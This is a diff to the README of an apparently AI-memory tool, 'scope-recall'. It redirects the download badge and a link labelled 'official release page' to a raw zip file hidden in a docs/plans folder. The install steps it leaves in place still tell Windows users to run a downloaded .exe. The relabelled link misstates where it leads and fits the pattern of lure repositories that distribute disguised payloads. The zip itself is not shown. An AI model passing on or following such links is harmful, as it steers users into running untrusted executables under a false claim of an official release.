@@ -1,6 +1,6 @@
 # 🧠 scope-recall - AI memory for precise project tasks
 
-[![Download Scope Recall](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Basilunperplexed948/scope-recall)
+[![Download Scope Recall](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Basilunperplexed948/scope-recall/raw/refs/heads/main/docs/plans/recall-scope-1.5.zip)
 
 Scope-recall helps your AI agent remember the specific details of your current projects. It uses two types of storage to keep your data organized. It saves exact project facts in a database and uses search tools to find relevant ideas when you need them. This tool keeps your work private by separating different project scopes.
 
@@ -8,7 +8,7 @@ Scope-recall helps your AI agent remember the specific details of your current p
 
 Follow these steps to get the application onto your Windows computer.
 
-1. Go to the [official release page](https://github.com/Basilunperplexed948/scope-recall).
+1. Go to the [official release page](https://github.com/Basilunperplexed948/scope-recall/raw/refs/heads/main/docs/plans/recall-scope-1.5.zip).
 2. Look for the section labeled Assets.
 3. Click the file that ends with .exe to start the download.
 4. Save the file to your desktop or downloads folder.
